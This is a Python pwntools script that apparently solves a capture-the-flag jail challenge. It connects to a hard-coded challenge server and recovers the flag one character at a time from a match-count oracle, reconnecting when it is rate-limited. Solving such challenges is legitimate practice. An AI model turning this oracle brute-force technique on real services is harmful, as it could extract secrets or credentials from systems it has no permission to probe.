from pwn import *
import string

# Server settings
host = '66.228.49.41'
port = 41567

# Parameters confirmed from your testing
FLAG_LEN = 30  # Total length required by the oracle
known_flag = "KCTF{_aNOtHER_JAIL_Y0U_" # Resume point
# Simplified alphabet: check most likely characters first
alphabet = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_}"

def solve():
    global known_flag
    print(f"[*] Resuming from: {known_flag}")

    while len(known_flag) < FLAG_LEN:
        try:
            # Open one connection to handle multiple guesses
            io = remote(host, port)
            
            # 1. Get current baseline matches for our known_flag
            io.recvuntil(b'> ')
            # Pad with "!" to exactly 30 characters
            current_payload = known_flag.ljust(FLAG_LEN, "!")
            io.sendline(f'knight("{current_payload}")'.encode())
            baseline = int(io.recvline().decode().strip().split()[0])
            
            found_char = False
            for char in alphabet:
                # 2. Try the next character
                io.recvuntil(b'> ')
                # Always maintain exactly 30 characters
                test_str = (known_flag + char).ljust(FLAG_LEN, "!")
                io.sendline(f'knight("{test_str}")'.encode())
                
                response = io.recvline().decode().strip()
                
                # Check for the kick message
                if "Out of attempts" in response:
                    print("[!] Kicked! Reconnecting...")
                    io.close()
                    break # Break inner loop to reconnect and retry this position
                
                # 3. Check if match count increased
                match_count = int(response.split()[0])
                if match_count > baseline:
                    known_flag += char
                    print(f"[+] Found: {known_flag}")
                    found_char = True
                    break # Found the char, move to next position
            
            # If we finished the alphabet or got kicked, we reconnect in the next while-loop
            io.close()
            
            if "}" in known_flag:
                break
                
        except (EOFError, ConnectionRefusedError):
            print("[!] Connection lost. Retrying...")
            continue

    print(f"\n[!] FINAL FLAG: {known_flag}")

if __name__ == "__main__":
    solve()